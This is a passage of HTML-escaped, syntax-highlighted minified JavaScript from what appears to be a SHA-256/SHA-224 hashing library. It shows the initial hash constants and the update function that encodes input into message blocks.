class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]}&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0xc1059ed8&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x367cd507&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x3070dd17&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0xf70e5939&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0xffc00b31&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x68581511&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x64f98fa7&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0xbefa4fa4&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x6a09e667&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0xbb67ae85&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x3c6ef372&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0xa54ff53a&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x510e527f&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x9b05688c&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x1f83d9ab&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x5be0cd19&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">block&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hBytes&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">finalized&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hashed&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">first&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">finalized&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">notString&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">typeof&lt;/span> &lt;span class="nx">message&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="o">!==&lt;/span>&lt;span class="s1">&amp;#39;string&amp;#39;&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s1">&amp;#39;object&amp;#39;&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="kc">null&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ERROR&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ARRAY_BUFFER&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">constructor&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="nx">ArrayBuffer&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="nx">Uint8Array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nb">Array&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isArray&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">ARRAY_BUFFER&lt;/span>&lt;span class="o">||!&lt;/span>&lt;span class="nx">ArrayBuffer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isView&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)){&lt;/span>&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ERROR&lt;/span>&lt;span class="p">)}}}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ERROR&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">notString&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">code&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hashed&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hashed&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">block&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">notString&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">SHIFT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]}}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">charCodeAt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">SHIFT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mh">0x800&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xc0&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">SHIFT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">SHIFT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mh">0xd800&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="mh">0xe000&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xe0&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">SHIFT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">SHIFT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">SHIFT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mh">0x10000&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3ff&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">charCodeAt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">index&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3ff&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xf0&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">SHIFT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">SHIFT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">SHIFT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x80&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">code&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x3f&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="nx">SHIFT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">++&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]}}}&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">lastByteIndex&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">block&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hash&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hashed&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">start&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">}}&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="mi">4294967295&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hBytes&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">4294967296&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span 